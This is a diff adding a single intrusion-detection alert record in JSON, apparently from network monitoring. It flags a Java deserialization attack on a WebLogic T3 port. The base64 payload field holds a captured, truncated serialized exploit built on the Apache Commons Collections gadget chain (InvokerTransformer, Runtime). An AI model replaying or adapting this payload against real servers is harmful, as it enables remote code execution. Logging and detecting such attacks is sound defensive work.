@@ -1,0 +1,41 @@
+{
+  "timestamp": "2021-01-27 14:38:26",
+  "flow_id": 896792717424889,
+  "in_iface": "ens33",
+  "event_type": "alert",
+  "vlan": [
+    3776
+  ],
+  "src_ip": "192.168.43.65",
+  "src_port": 49670,
+  "dest_ip": "106.52.122.133",
+  "dest_port": 7001,
+  "proto": "TCP",
+  "bytes_sent_total": 3281090355,
+  "bytes_received_total": 1733377876,
+  "metadata": {
+    "flowbits": [
+      "t3"
+    ]
+  },
+  "alert": {
+    "action": "allowed",
+    "gid": 1,
+    "signature_id": 3001449,
+    "rev": 0,
+    "signature": "shellcode.Exploit.Java.Serialized.Commons.collections attempt",
+    "category": "web-attack",
+    "severity": 2
+  },
+  "app_proto": "other",
+  "flow": {
+    "pkts_toserver": 8370128,
+    "pkts_toclient": 7609207,
+    "bytes_toserver": 3281090355,
+    "bytes_toclient": 1733377876,
+    "start": "2021-01-27 10:43:39"
+  },
+  "payload": "AAAIkwVlCAAAAAEAAAAbAAAAXQEBAHNyAXhwc3ICeHAAAAAAAAAAAHVyA3hwAAAAAHh0AAh3ZWJsb2dpY3VyBHhwAAAADJyXmpqMmpvPz5uTmnQACHdlYmxvZ2ljBv4BAACs7QAFc3IAHXdlYmxvZ2ljLnJqdm0uQ2xhc3NUYWJsZUVudHJ5L1JlgVf0+e0MAAB4cHIAAltCrPMX+AYIVOACAAB4cHcCAAB4/gEAAKztAAVzcgAdd2VibG9naWMucmp2bS5DbGFzc1RhYmxlRW50cnkvUmWBV/T57QwAAHhwcgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHB3AgAAeP4BAACs7QAFc3IAHXdlYmxvZ2ljLnJqdm0uQ2xhc3NUYWJsZUVudHJ5L1JlgVf0+e0MAAB4cHIAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHB3AgAAeP4BAACs7QAFc3IAJXdlYmxvZ2ljLmptcy5jb21tb24uU3RyZWFtTWVzc2FnZUltcGxriN5Nk8vUXQwAAHhyAB93ZWJsb2dpYy5qbXMuY29tbW9uLk1lc3NhZ2VJbXBsaRJhYdBN8UIMAAB4cHoAAAP3KCAAAAAAAAABAAAFeKztAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFMAAFodAAlTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyO3hwc3EAfgAAc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnR0ABJMamF2YS9sYW5nL09iamVjdDt4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplYw==",
+  "stream": 0,
+  "host": "nta-cowman"
+}
